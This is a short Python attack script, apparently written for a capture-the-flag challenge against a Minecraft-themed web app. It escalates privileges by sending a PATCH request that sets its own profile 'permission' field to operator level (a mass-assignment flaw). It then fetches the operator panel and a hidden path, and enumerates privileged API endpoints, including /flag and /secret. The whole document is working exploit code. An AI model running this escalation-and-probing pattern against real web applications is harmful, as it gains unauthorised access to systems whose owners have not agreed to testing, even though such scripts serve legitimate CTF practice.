#!/usr/bin/env python3
import requests

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

# Step 1: Elevate to Operator
r = s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
            headers={'Accept': 'application/json'}, timeout=15)
print('Elevation:', r.json())
print()

def req(method, path, **kw):
    try:
        r = getattr(s, method)(BASE + path, timeout=15, allow_redirects=False, **kw)
        return r.status_code, r.text
    except Exception as e:
        return 0, str(e)

# Check profile
code, body = req('get', '/api/v2/player/profile', headers={'Accept': 'application/json'})
print('Profile:', body[:300])
print()

# Access operator panel
code, body = req('get', '/operator/')
print(f'=== /operator/ [{code}] ===')
print(body[:2000])
print()

# Try nether
code, body = req('get', '/nether')
print(f'=== /nether [{code}] ===')
print(body[:1500])
print()

# Enumerate API as OP
op_paths = [
    '/api/v2/operator', '/api/v2/operator/',
    '/api/v2/server', '/api/v2/server/info',
    '/api/v2/server/telemetry', '/api/v2/server/logs',
    '/api/v2/chunk/Chunk_0x84', '/api/v2/world/chunk/Chunk_0x84',
    '/api/v2/dimension/nether', '/api/v2/dimension/end', '/api/v2/dimension/rift',
    '/api/v2/command-block', '/api/v2/ancient', '/api/v2/ancient-command-block',
    '/api/v2/nbt', '/api/v2/flag', '/api/v2/secret',
]
for path in op_paths:
    code, body = req('get', path, headers={'Accept': 'application/json'})
    if code not in [404, 0]:
        print(f'[{code}] {path}: {body[:400]}')
        print()
